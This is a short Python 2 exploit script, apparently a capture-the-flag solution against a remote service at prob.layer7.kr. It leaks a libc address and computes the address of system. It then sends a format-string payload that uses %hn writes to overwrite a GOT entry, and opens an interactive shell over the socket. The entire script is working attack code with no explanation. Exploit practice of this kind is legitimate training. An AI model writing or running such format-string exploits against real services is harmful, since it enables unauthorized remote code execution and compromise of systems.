import struct
import socket
import telnetlib
from hexdump import *

#s = socket.create_connection(['0',1234])
s = socket.create_connection(['prob.layer7.kr',10002])
raw_input()
s.send("aaaaaaaa\n")
libc = struct.unpack('<I',s.recv(1024)[0xc:0x10])[0]-0xcdc8
system = "%s"%hex(libc++0x3a920)[2:]
print system
b1 = int(system[0:4],16)
b2 = int(system[4:],16)
print hex(b1),hex(b2)
print hex(libc)
s.send("AAAA"+struct.pack('<I',0x804A010)+"AAAA"+struct.pack('<I',0x804A012)+"%x"*6+"%"+str(b2-0x2c)+"c"+"%hn"+"%"+str(b1-b2)+"c"+"%hn"+"\x00")
#s.send('/bin/sh;\n')
raw_input()
t = telnetlib.Telnet()
t.sock = s
t.interact()
